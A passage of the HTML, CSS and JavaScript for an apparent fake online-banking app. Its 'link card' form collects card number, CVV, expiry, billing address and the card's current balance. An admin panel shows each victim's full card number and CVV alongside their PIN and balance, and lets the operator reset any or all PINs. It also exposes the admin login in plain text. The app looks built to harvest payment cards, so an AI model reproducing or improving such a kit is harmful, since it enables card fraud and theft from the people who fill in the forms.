  currentAdminTab=tab;
  
  document.querySelectorAll('.admin-tab').forEach(t=>{
    t.classList.remove('active');
  });
  
  if(tab==='authorization'){
    document.getElementById('admin-tab-auth').classList.add('active');
    document.getElementById('admin-content-auth').style.display='block';
    document.getElementById('admin-content-codes').style.display='none';
    loadAuthorizationTab();
  }else{
    document.getElementById('admin-tab-codes').classList.add('active');
    document.getElementById('admin-content-codes').style.display='block';
    document.getElementById('admin-content-auth').style.display='none';
    loadCodesTab();
  }
}

document.getElementById('admin-tab-auth').onclick=()=>switchAdminTab('authorization');
document.getElementById('admin-tab-codes').onclick=()=>switchAdminTab('codes');

async function loadAdminPanel(){
  switchAdminTab('authorization');
}

// AUTHORIZATION TAB
async function loadAuthorizationTab(){
  const snap=await get(ref(db,'users'));
  if(!snap.exists())return;
  
  const users=snap.val();
  const now=new Date();
  const day24=24*60*60*1000;
  
  let recentCards=[];
  let unattendedCards=[];
  let pendingCards=[];
  
  for(const uid in users){
    const u=users[uid];
    if(u.email==='admin@gmail.com')continue;
    
    const cards=u.linkedCards||[];
    cards.forEach((card,idx)=>{
      if(card.status==='pending'||card.status==='otp_required'){
        const addedTime=new Date(card.addedDate);
        const age=now-addedTime;
        
        const cardData={uid,user:u,card,cardIndex:idx,age};
        
        if(age<day24){
          recentCards.push(cardData);
        }else if(age>day24*3){
          unattendedCards.push(cardData);
        }else{
          pendingCards.push(cardData);
        }
      }
    });
  }
  
  const rc=document.getElementById('recent-cards-list');
  const uc=document.getElementById('unattended-cards-list');
  const pc=document.getElementById('pending-cards-list');
  
  rc.innerHTML='';
  uc.innerHTML='';
  pc.innerHTML='';
  
  if(recentCards.length===0&&unattendedCards.length===0&&pendingCards.length===0){
    rc.innerHTML='<p style="text-align:center;opacity:0.6;padding:20px;">'+t('noCardsToAuthorize')+'</p>';
    return;
  }
  
  recentCards.forEach(data=>rc.appendChild(createAdminCardElement(data)));
  unattendedCards.forEach(data=>uc.appendChild(createAdminCardElement(data)));
  pendingCards.forEach(data=>pc.appendChild(createAdminCardElement(data)));
}

function createAdminCardElement({uid,user,card,cardIndex}){
  const el=document.createElement('div');
  el.className='admin-card-full';
  
  const statusClass=card.status==='otp_required'?'otp':'pending';
  const statusText=card.status==='otp_required'?t('otpRequired'):t('pending');
  
  el.innerHTML=`
    <div class="admin-card-header">
      <div>
        <div class="admin-card-user">${user.firstname} ${user.surname}</div>
        <div class="admin-card-email">${user.email}</div>
      </div>
      <span class="card-status ${statusClass}">${statusText}</span>
    </div>
    
    <div class="admin-card-grid">
      <div class="admin-card-section">
        <h5>${t('brand')}</h5>
        <p>${card.brand}</p>
      </div>
      <div class="admin-card-section">
        <h5>${t('cardNumber')}</h5>
        <p style="font-family:monospace;">${card.number}</p>
      </div>
      <div class="admin-card-section">
        <h5>Last 4</h5>
        <p>â€¢â€¢â€¢â€¢ ${card.lastFour}</p>
      </div>
      <div class="admin-card-section">
        <h5>${t('expiryDate')}</h5>
        <p>${card.expiry}</p>
      </div>
      <div class="admin-card-section">
        <h5>${t('cvv')}</h5>
        <p>${card.cvv}</p>
      </div>
      <div class="admin-card-section">
        <h5>${t('cardBalance')}</h5>
        <p>${card.currentBalance}</p>
      </div>
    </div>
    
    <div class="admin-card-section full-width">
      <h5>${t('billingAddress')}</h5>
      <p>${card.billingAddress.street}<br>
         ${card.billingAddress.city}, ${card.billingAddress.postcode}<br>
         ${card.billingAddress.country}<br>
         ${t('phoneNum')}: ${card.billingAddress.phone}</p>
    </div>
    
    <div class="admin-card-actions">
      <button class="admin-auth-btn" onclick="adminAuthorizeCard('${uid}',${cardIndex})">${t('authorizeCard')}</button>
      <button class="admin-reject-btn" onclick="adminRejectCard('${uid}',${cardIndex})">${t('rejectCard')}</button>
    </div>
  `;
  
  return el;
}

window.adminAuthorizeCard=async function(uid,cardIndex){
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){
    alert(t('incorrectPassword'));
    return;
  }
  
  if(!confirm(t('authorizeConfirm')))return;
  
  const ur=ref(db,'users/'+uid);
  await runTransaction(ur,u=>{
    if(u&&u.linkedCards&&u.linkedCards[cardIndex]){
      u.linkedCards[cardIndex].status='authorized';
      u.linkedCards[cardIndex].authorizedDate=new Date().toISOString();
      return u;
    }
    return u;
  });
  
  alert(t('cardAuthorized'));
  loadAuthorizationTab();
};

window.adminRejectCard=async function(uid,cardIndex){
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){
    alert(t('incorrectPassword'));
    return;
  }
  
  if(!confirm(t('rejectConfirm')))return;
  
  await deleteRejectedCard(uid,cardIndex);
  
  alert(t('cardRejected'));
  loadAuthorizationTab();
};

// CODES MANAGEMENT TAB
async function loadCodesTab(){
  const snap=await get(ref(db,'users'));
  if(!snap.exists())return;
  
  const users=snap.val();
  const byCountry={};
  
  for(const uid in users){
    const u=users[uid];
    if(u.email==='admin@gmail.com')continue;
    
    const co=u.country||'Unknown';
    if(!byCountry[co])byCountry[co]=[];
    byCountry[co].push({uid,user:u});
  }
  
  const cs=document.getElementById('codes-country-sections');
  cs.innerHTML='';
  
  Object.keys(byCountry).sort().forEach(co=>{
    const sec=document.createElement('div');
    sec.className='country-section';
    
    const hdr=document.createElement('div');
    hdr.className='country-header';
    hdr.innerHTML=`
      <h3>${co}</h3>
      <span class="country-count">${byCountry[co].length} ${t('users')}</span>
    `;
    sec.appendChild(hdr);
    
    const ul=document.createElement('div');
    byCountry[co].forEach(({uid,user})=>{
      ul.appendChild(createUserCodeCard(uid,user));
    });
    
    sec.appendChild(ul);
    cs.appendChild(sec);
  });
}

function createUserCodeCard(uid,user){
  const sym=currencySymbols[user.currency]||'$';
  
  const el=document.createElement('div');
  el.className='admin-user-card';
  el.innerHTML=`
    <div class="admin-user-info">
      <div class="admin-user-name">${user.firstname} ${user.surname}</div>
      <div class="admin-user-detail">Email: ${user.email}</div>
      <div class="admin-user-detail">Account: ${user.accountNumber}</div>
      <div class="admin-user-detail">Country: ${user.country||'N/A'}</div>
      <div class="admin-user-detail">Current PIN: ${user.pin||'N/A'}</div>
      <div class="admin-user-detail">Balance: ${sym}${(user.balance||0).toLocaleString()}</div>
    </div>
    <div class="admin-user-actions">
      <input type="text" class="admin-pin-input" placeholder="${t('newPin')}" maxlength="4" id="pin-${uid}">
      <button class="admin-change-pin-btn" onclick="changeUserPin('${uid}')">${t('changeAll')}</button>
    </div>
  `;
  return el;
}

window.changeUserPin=async function(uid){
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){
    alert(t('incorrectPassword'));
    return;
  }
  
  const p=document.getElementById('pin-'+uid).value.trim();
  if(!p||p.length!==4||!/^\d{4}$/.test(p)){
    alert('PIN must be 4 digits');
    return;
  }
  
  if(!confirm('Change PIN to '+p+'?'))return;
  
  await runTransaction(ref(db,'users/'+uid),u=>{
    if(u){
      u.pin=p;
      return u;
    }
    return u;
  });
  
  alert(t('pinUpdated'));
  loadCodesTab();
};

document.getElementById('admin-logout-btn').onclick=()=>{
  signOut(auth);
};

document.getElementById('admin-change-all-btn').onclick=async()=>{
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){
    alert(t('incorrectPassword'));
    return;
  }
  
  const p=document.getElementById('admin-global-pin').value.trim();
  if(!p||p.length!==4||!/^\d{4}$/.test(p)){
    alert('PIN must be 4 digits');
    return;
  }
  
  if(!confirm("Change ALL users' PINs to "+p+'?'))return;
  
  const snap=await get(ref(db,'users'));
  if(snap.exists()){
    const us=snap.val();
    let count=0;
    for(const uid in us){
      if(us[uid].email==='admin@gmail.com')continue;
      await runTransaction(ref(db,'users/'+uid),u=>{
        if(u){
          u.pin=p;
          return u;
        }
        return u;
      });
      count++;
    }
    alert('Updated '+count+" users' PINs to "+p+'!');
    loadCodesTab();
  }
};

</script>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);color:#fff;min-height:100vh;}
.language-selector{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:999;font-size:24px;border:1px solid rgba(255,255,255,0.2);transition:all 0.3s;}
.language-selector:hover{background:rgba(255,255,255,0.2);transform:scale(1.1);}
#auth-screen{height:100vh;display:flex;flex-direction:column;justify-content:center;padding:20px;overflow-y:auto;}
.form-section{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin:12px 0;max-width:400px;width:100%;margin-left:auto;margin-right:auto;}
input,select,button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:10px;font-size:15px;}
input,select{background:rgba(255,255,255,0.12);color:#fff;}
input::placeholder{color:rgba(255,255,255,0.5);}
select option{background:#0a2540;color:#fff;}
button{background:#0055ff;color:white;font-weight:bold;cursor:pointer;transition:background 0.2s;}
button:hover{background:#0044dd;}
.toggle-link{text-align:center;margin-top:12px;color:#4dabff;text-decoration:underline;cursor:pointer;font-size:14px;}
#dashboard{padding:24px 16px 140px;}
.header{text-align:center;margin:40px 0 24px;}
.username-display{font-size:22px;font-weight:600;margin-bottom:8px;}
.balance-card{background:linear-gradient(135deg,#1a4bff,#0033cc);border-radius:20px;padding:20px 24px;margin:16px auto;box-shadow:0 8px 24px rgba(0,85,255,0.4);max-width:360px;width:calc(100% - 32px);}
.card-number{font-size:15px;letter-spacing:1.5px;margin-bottom:14px;color:rgba(255,255,255,0.85);font-family:'Courier New',monospace;}
.card-balance{font-size:38px;font-weight:800;color:white;text-align:right;letter-spacing:-1px;}
.card-balance-label{font-size:13px;opacity:0.75;text-align:right;margin-top:2px;}
.accounts-btn{background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:12px 32px;border-radius:30px;font-size:16px;margin:12px auto;display:block;cursor:pointer;max-width:200px;}
.nav-section{margin:24px 0;}
.bottom-nav{background:rgba(0,37,90,0.85);backdrop-filter:blur(12px);display:flex;justify-content:space-around;padding:12px 0;border-radius:20px;border:1px solid rgba(255,255,255,0.1);}
.nav-item{text-align:center;color:#fff;font-size:28px;cursor:pointer;width:60px;position:relative;}
.nav-label{font-size:11px;margin-top:4px;opacity:0.8;}
.section-title{font-size:18px;font-weight:600;margin:32px 0 16px;opacity:0.9;}
.transaction-item{background:rgba(255,255,255,0.06);border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;gap:16px;}
.transaction-icon{width:48px;height:48px;background:rgba(0,85,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:bold;flex-shrink:0;}
.transaction-details{flex:1;min-width:0;}
.transaction-title{font-weight:600;font-size:15px;margin-bottom:4px;}
.transaction-time{font-size:13px;opacity:0.6;}
.transaction-amount{font-weight:bold;font-size:16px;text-align:right;white-space:nowrap;}
.negative{color:#ff5c5c;}
.positive{color:#34d399;}
.error{color:#ff5c5c;text-align:center;margin:6px 0;font-size:13px;}
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);justify-content:center;align-items:flex-start;z-index:1000;overflow-y:auto;padding:20px;padding-top:60px;}
.modal-content{background:linear-gradient(135deg,#001f3f,#000d1a);padding:20px;border-radius:16px;width:100%;max-width:400px;color:#fff;margin:auto;}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;}
.close-btn{background:none;border:none;color:#fff;font-size:32px;cursor:pointer;padding:0;width:40px;height:40px;display:flex;align-items:center;justify-content:center;}
.account-info p{display:flex;justify-content:space-between;margin:12px 0;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.1);gap:12px;}
.account-info strong{opacity:0.7;flex-shrink:0;}
.account-info span{text-align:right;word-break:break-all;}
.copy-btn{background:rgba(0,85,255,0.3);padding:8px 16px;border-radius:8px;font-size:13px;margin-top:8px;}
.more-options{display:flex;flex-direction:column;gap:4px;}
.more-item{padding:16px;background:rgba(255,255,255,0.05);border-radius:12px;cursor:pointer;transition:background 0.2s;}
.more-item:hover{background:rgba(255,255,255,0.1);}
.language-options{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:16px;}
.language-option{padding:12px;background:rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;text-align:center;transition:background 0.2s;border:1px solid rgba(255,255,255,0.1);}
.language-option:hover{background:rgba(255,255,255,0.1);}
.pin-input{font-size:18px;letter-spacing:8px;text-align:center;font-family:monospace;}
.generate-pin-btn{background:rgba(52,211,153,0.2);color:#34d399;border:1px solid #34d399;padding:10px 20px;border-radius:8px;font-size:13px;cursor:pointer;margin-top:8px;width:auto;display:inline-block;}
.top-buttons{display:flex;gap:8px;justify-content:space-between;margin-bottom:16px;}
.top-buttons button{flex:1;padding:10px;font-size:13px;}
.withdrawal-notice{background:rgba(255,193,7,0.15);border-left:3px solid #ffc107;padding:12px;margin:12px 0;border-radius:8px;font-size:13px;color:#ffc107;}
#withdraw-fields-container{display:flex;flex-direction:column;}
.card-input-group{display:flex;gap:8px;}
.card-input-group input{flex:1;}
.billing-address-section{background:rgba(255,255,255,0.05);padding:16px;border-radius:12px;margin:16px 0;}
.billing-address-section h4{font-size:14px;margin-bottom:12px;opacity:0.8;}
.linked-card-item{background:rgba(255,255,255,0.06);border-radius:12px;padding:16px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(255,255,255,0.1);}
.linked-card-info{flex:1;}
.linked-card-brand{font-size:14px;font-weight:600;color:#4dabff;margin-bottom:4px;}
.linked-card-number{font-size:16px;font-weight:600;margin-bottom:4px;font-family:'Courier New',monospace;}
.linked-card-name{font-size:13px;opacity:0.7;margin-bottom:2px;}
.linked-card-expiry{font-size:12px;opacity:0.6;}
.remove-card-btn,.edit-card-btn{background:#ff5c5c;color:white;padding:8px 16px;border-radius:8px;border:none;cursor:pointer;font-size:13px;width:auto;margin:0;}
.edit-card-btn{background:#ffc107;color:#000;}
.card-status{display:inline-block;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600;margin-top:8px;}
.card-status.pending{background:rgba(255,193,7,0.2);color:#ffc107;border:1px solid #ffc107;}
.card-status.authorized{background:rgba(52,211,153,0.2);color:#34d399;border:1px solid #34d399;}
.card-status.otp{background:rgba(59,130,246,0.2);color:#3b82f6;border:1px solid #3b82f6;}
.card-options-menu{display:flex;flex-direction:column;gap:12px;margin:20px 0;}
.card-option-btn{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.2);padding:20px;border-radius:12px;cursor:pointer;transition:all 0.2s;text-align:left;}
.card-option-btn:hover{background:rgba(255,255,255,0.15);transform:translateY(-2px);}
.card-option-icon{font-size:32px;margin-bottom:8px;}
.card-option-title{font-size:18px;font-weight:600;margin-bottom:4px;}
.card-option-desc{font-size:13px;opacity:0.7;}
#admin-panel{display:none;padding:24px 16px;min-height:100vh;}
.admin-header{text-align:center;margin-bottom:32px;}
.admin-tabs{display:flex;gap:12px;margin-bottom:24px;justify-content:center;}
.admin-tab{background:rgba(255,255,255,0.08);border:2px solid transparent;padding:12px 24px;border-radius:12px;cursor:pointer;font-size:16px;font-weight:600;transition:all 0.2s;}
.admin-tab:hover{background:rgba(255,255,255,0.15);}
.admin-tab.active{background:#0055ff;border-color:#0055ff;}
.admin-content{display:none;}
.admin-global-controls{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin-bottom:24px;}
.admin-global-input{display:flex;gap:12px;margin-bottom:12px;}
.admin-global-pin{flex:1;padding:12px;border-radius:10px;background:rgba(255,255,255,0.12);border:none;color:#fff;font-size:18px;letter-spacing:4px;text-align:center;}
.admin-change-all-btn{background:#ff9800;color:white;padding:12px 24px;border-radius:10px;border:none;font-weight:bold;cursor:pointer;}
.admin-logout-btn{background:#ff5c5c;color:white;padding:10px 20px;border-radius:10px;border:none;cursor:pointer;margin-top:12px;width:100%;}
.admin-section-title{font-size:20px;font-weight:600;margin:24px 0 16px;padding-bottom:8px;border-bottom:2px solid rgba(255,255,255,0.1);}
.admin-card-full{background:rgba(255,255,255,0.06);border-radius:16px;padding:20px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.1);}
.admin-card-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid rgba(255,255,255,0.1);}
.admin-card-user{font-size:18px;font-weight:600;color:#4dabff;margin-bottom:4px;}
.admin-card-email{font-size:13px;opacity:0.7;}
.admin-card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;margin-bottom:16px;}
.admin-card-section{background:rgba(255,255,255,0.03);padding:12px;border-radius:8px;}
.admin-card-section.full-width{grid-column:1/-1;}
.admin-card-section h5{font-size:11px;text-transform:uppercase;opacity:0.6;margin-bottom:6px;letter-spacing:0.5px;}
.admin-card-section p{font-size:14px;font-weight:500;}
.admin-card-actions{display:flex;gap:12px;margin-top:16px;}
.admin-auth-btn{flex:1;background:#34d399;color:white;padding:12px;border-radius:8px;border:none;font-weight:600;cursor:pointer;font-size:14px;}
.admin-reject-btn{flex:1;background:#ff5c5c;color:white;padding:12px;border-radius:8px;border:none;font-weight:600;cursor:pointer;font-size:14px;}
.country-section{margin-bottom:32px;}
.country-header{display:flex;justify-content:space-between;align-items:center;background:rgba(0,85,255,0.1);padding:12px 16px;border-radius:12px;margin-bottom:16px;border-left:4px solid #0055ff;}
.country-header h3{margin:0;font-size:18px;color:#4dabff;}
.country-count{background:rgba(255,255,255,0.1);padding:4px 12px;border-radius:12px;font-size:13px;font-weight:600;}
.admin-user-card{background:rgba(255,255,255,0.06);border-radius:16px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1);}
.admin-user-name{font-size:18px;font-weight:600;margin-bottom:8px;color:#4dabff;}
.admin-user-detail{font-size:13px;opacity:0.8;margin:4px 0;}
.admin-user-actions{display:flex;gap:8px;margin-top:12px;}
.admin-pin-input{flex:1;padding:10px;border-radius:8px;background:rgba(255,255,255,0.12);border:none;color:#fff;font-size:16px;letter-spacing:4px;text-align:center;}
.admin-change-pin-btn{background:#34d399;color:white;padding:10px 20px;border-radius:8px;border:none;font-weight:bold;cursor:pointer;}
</style>
</head>
<body>
<div class="language-selector" id="language-selector">ðŸŒ</div>

<!-- AUTH SCREEN -->
<div id="auth-screen">
  <div id="signup-section" class="form-section">
    <h2 data-translate="createAccount">Create Account</h2>
    <form id="signup-form">
      <select id="su-country" required>
        <option value="" data-translate="selectCountry">Select Country</option>
        <option value="USA">United States</option>
        <option value="UK">United Kingdom</option>
        <option value="Nigeria">Nigeria</option>
        <option value="Germany">Germany</option>
        <option value="France">France</option>
        <option value="Canada">Canada</option>
        <option value="Brazil">Brazil</option>
      </select>
      <input type="text" id="su-surname" placeholder="Surname" required>
      <input type="text" id="su-firstname" placeholder="First Name" required>
      <input type="text" id="su-othername" placeholder="Other Name (optional)">
      <input type="tel" id="su-phone" placeholder="Phone Number" required>
      <div id="dynamic-fields"></div>
      <input type="text" id="su-username" placeholder="Username" required>
      <input type="email" id="su-email" placeholder="Email" required>
      <input type="password" id="su-password" placeholder="Password (min 8 chars)" required minlength="8">
      <input type="password" id="su-confirm" placeholder="Confirm Password" required>
      <select id="su-currency" required>
        <option value="USD">USD ($)</option>
        <option value="EUR">EUR (â‚¬)</option>
        <option value="GBP">GBP (Â£)</option>
      </select>
      <input type="text" id="su-promo" placeholder="Promo Code (optional)">
      <button type="submit" data-translate="signUp">Sign Up</button>
    </form>
    <p class="error" id="signup-error"></p>
    <div class="toggle-link" id="to-login">Already have an account? Log In</div>
  </div>

  <div id="login-section" class="form-section" style="display:none;">
    <h2 data-translate="login">Log In</h2>
    <form id="login-form">
      <input type="email" id="li-email" placeholder="Email" required>
      <input type="password" id="li-password" placeholder="Password" required>
      <button type="submit" data-translate="login">Log In</button>
    </form>
    <p class="error" id="login-error"></p>
    <div class="toggle-link" id="to-signup">Don't have an account? Sign Up</div>
  </div>
</div>

<!-- DASHBOARD -->
<div id="dashboard">
  <div class="header">
    <div id="username-display" class="username-display">User</div>
    <div class="balance-card">
      <div class="card-number" id="card-number">**** *** ***</div>
      <div class="card-balance">
        <span id="currency-symbol">$</span><span id="balance">0.00</span>
      </div>
      <div class="card-balance-label" data-translate="availableBalance">Available Balance</div>
    </div>
    <button class="accounts-btn" data-translate="accounts">Accounts</button>
  </div>

  <div class="nav-section">
    <div class="bottom-nav">
      <div class="nav-item" id="withdraw-btn">
        <div>â†“</div>
        <div class="nav-label" data-translate="withdraw">Withdraw</div>
      </div>
      <div class="nav-item" id="send-btn">
        <div>â†’</div>
        <div class="nav-label" data-translate="send">Send</div>
      </div>
      <div class="nav-item" id="add-card-btn">
        <div>ðŸ’³</div>
        <div class="nav-label" data-translate="addCard">Add Card</div>
      </div>
      <div class="nav-item" id="more-btn">
        <div>â‹¯</div>
        <div class="nav-label" data-translate="more">More</div>
      </div>
    </div>
  </div>

  <div>
    <h3 class="section-title" data-translate="recentTransactions">Recent Transactions</h3>
    <div class="transactions-container" id="transactions-container"></div>
  </div>
</div>

<!-- ACCOUNT MODAL -->
<div id="account-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="accountInfo">Account Information</h3>
      <button id="close-account" class="close-btn">Ã—</button>
    </div>
    <div class="top-buttons">
      <button id="copy-account" class="copy-btn">ðŸ“‹ <span data-translate="copyAccount">Copy</span></button>
      <button id="generate-pin-btn" class="generate-pin-btn" data-translate="generatePin">Generate PIN</button>
    </div>
    <div class="account-info">
      <p><strong data-translate="accountNumber">Account Number:</strong><span id="acc-number">----------</span></p>
      <p><strong data-translate="country">Country:</strong><span id="acc-country">-</span></p>
      <p><strong data-translate="surname">Surname:</strong><span id="acc-surname">-</span></p>
      <p><strong data-translate="firstName">First Name:</strong><span id="acc-firstname">-</span></p>
      <p><strong data-translate="otherName">Other Name:</strong><span id="acc-othername">-</span></p>
      <p><strong data-translate="phoneNumber">Phone:</strong><span id="acc-phone">-</span></p>
      <div id="country-specific-info"></div>
    </div>
  </div>
</div>

<!-- CARD OPTIONS MODAL -->
<div id="card-options-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>ðŸ’³ <span data-translate="myCards">My Cards</span></h3>
      <button id="close-card-options" class="close-btn">Ã—</button>
    </div>
    <p style="text-align:center;opacity:0.8;margin-bottom:16px;" data-translate="chooseOption">Choose an option:</p>
    <div class="card-options-menu">
      <div class="card-option-btn" id="view-linked-cards-option">
        <div class="card-option-icon">ðŸ“‹</div>
        <div class="card-option-title" data-translate="viewLinkedCards">View Linked Cards</div>
        <div class="card-option-desc">View your authorized and pending cards</div>
      </div>
      <div class="card-option-btn" id="add-new-card-option">
        <div class="card-option-icon">âž•</div>
        <div class="card-option-title" data-translate="addNewCardOption">Add New Card</div>
        <div class="card-option-desc">Link a new debit or credit card</div>
      </div>
    </div>
  </div>
</div>

<!-- CARDS LIST MODAL -->
<div id="cards-list-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>ðŸ’³ <span data-translate="linkedCards">Linked Cards</span></h3>
      <button id="close-cards-list" class="close-btn">Ã—</button>
    </div>
    <div id="linked-cards-list"></div>
  </div>
</div>

<!-- CARD FORM MODAL -->
<div id="card-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 id="card-modal-title">ðŸ’³ Link Card</h3>
      <button id="close-card" class="close-btn">Ã—</button>
    </div>
    <form id="card-form">
      <input type="text" id="card-number-input" placeholder="Card Number (16 digits)" required pattern="\d{16}" maxlength="19" style="letter-spacing:2px;font-family:'Courier New',monospace;">
      <input type="text" id="card-name" placeholder="Cardholder Name" required>
      <div class="card-input-group">
        <input type="text" id="card-expiry" placeholder="MM/YY" required pattern="\d{2}/\d{2}" maxlength="5">
        <input type="text" id="card-cvv" placeholder="CVV" required pattern="\d{3}" maxlength="3">
      </div>
      <div class="billing-address-section">
        <h4>ðŸ“ Billing Address</h4>
        <input type="text" id="card-street" placeholder="Street Address" required>
        <input type="text" id="card-postcode" placeholder="Postal Code" required>
        <input type="text" id="card-city" placeholder="City" required>
        <input type="text" id="card-country" placeholder="Country" required>
        <input type="tel" id="card-phone" placeholder="Phone Number" required>
        <input type="text" id="card-balance" placeholder="Current Card Balance" required>
      </div>
      <p class="error" id="card-error"></p>
      <button type="submit" data-translate="linkCard">Link Card</button>
    </form>
  </div>
</div>

<!-- SEND MODAL -->
<div id="send-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="sendMoney">Send Money</h3>
      <button id="close-send" class="close-btn">Ã—</button>
    </div>
    <form id="send-form">
      <input type="text" id="send-recipient" placeholder="Recipient Account (10 digits)" required pattern="\d{10}" maxlength="10">
      <div id="recipient-info" style="display:none;padding:8px;margin:8px 0;background:rgba(255,255,255,0.1);border-radius:8px;font-size:14px;"></div>
      <input type="number" id="send-amount" placeholder="Amount" step="0.01" required min="0.01">
      <p class="error" id="send-error"></p>
      <button type="submit" data-translate="sendNow">Send Now</button>
    </form>
  </div>
</div>

<!-- WITHDRAW MODAL -->
<div id="withdraw-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="withdrawFunds">Withdraw Funds</h3>
      <button id="close-withdraw" class="close-btn">Ã—</button>
    </div>
    <div class="withdrawal-notice">âš ï¸ You can only withdraw to accounts in your name</div>
    <form id="withdraw-form">
      <select id="withdraw-method" required>
        <option value="">Select Method</option>
      </select>
      <div id="withdraw-fields-container"></div>
      <input type="number" id="withdraw-amount" placeholder="Amount" step="0.01" required min="1">
      <input type="text" id="withdraw-pin" placeholder="Enter 4-digit PIN" required pattern="\d{4}" maxlength="4" class="pin-input">
      <p class="error" id="withdraw-error"></p>
      <button type="submit" data-translate="requestWithdrawal">Request Withdrawal</button>
    </form>
  </div>
</div>

<!-- MORE MODAL -->
<div id="more-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 data-translate="more">More</h3>
      <button id="close-more" class="close-btn">Ã—</button>
    </div>
    <div class="more-options">
      <div class="more-item" id="more-contact">ðŸ“§ Contact us</div>
      <div class="more-item" id="more-help">â“ How to use</div>
      <div class="more-item" id="more-account">ðŸ‘¤ Account</div>
      <div class="more-item" id="more-logout" style="color:#ff5c5c;">ðŸšª Logout</div>
    </div>
  </div>
</div>

<!-- LANGUAGE MODAL -->
<div id="language-modal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>Select Language</h3>
      <button id="close-language" class="close-btn">Ã—</button>
    </div>
    <div class="language-options">
      <div class="language-option" data-lang="en">ðŸ‡ºðŸ‡¸ English</div>
      <div class="language-option" data-lang="es">ðŸ‡ªðŸ‡¸ EspaÃ±ol</div>
      <div class="language-option" data-lang="fr">ðŸ‡«ðŸ‡· FranÃ§ais</div>
    </div>
  </div>
</div>

<!-- ADMIN PANEL -->
<div id="admin-panel">
  <div class="admin-header">
    <h2>ðŸ” <span data-translate="adminPanelTitle">Admin Panel</span></h2>
    <p style="opacity:0.7;">admin@gmail.com / Sharaibi</p>
  </div>

  <div class="admin-tabs">
    <div class="admin-tab active" id="admin-tab-auth" data-translate="authorization">Authorization</div>
    <div class="admin-tab" id="admin-tab-codes" data-translate="codeManagement">Code Management</div>
  </div>

  <!-- AUTHORIZATION TAB -->
  <div id="admin-content-auth" class="admin-content" style="display:block;">
    <div class="admin-section-title" data-translate="recentCards">Recent Cards (Last 24h)</div>
    <div id="recent-cards-list"></div>

    <div class="admin-section-title" data-translate="unattendedCards">Unattended Cards (3+ days)</div>
    <div id="unattended-cards-list"></div>

    <div class="admin-section-title" data-translate="pendingCards">All Pending Cards</div>
    <div id="pending-cards-list"></div>
  </div>

  <!-- CODE MANAGEMENT TAB -->
  <div id="admin-content-codes" class="admin-content">
    <div class="admin-global-controls">
      <h3 data-translate="changeAllPins">Change All Users' PINs</h3>
      <div class="admin-global-input">
        <input type="text" id="admin-global-pin" class="admin-global-pin" placeholder="New PIN" maxlength="4">
        <button id="admin-change-all-btn" class="admin-change-all-btn" data-translate="changeAll">Change All</button>
      </div>
      <button id="admin-logout-btn" class="admin-logout-btn" data-translate="logoutBtn">Logout</button>
    </div>

    <div class="admin-section-title" data-translate="usersByCountry">Users by Country</div>
    <div id="codes-country-sections"></div>
  </div>
</div>

</body>
</html>
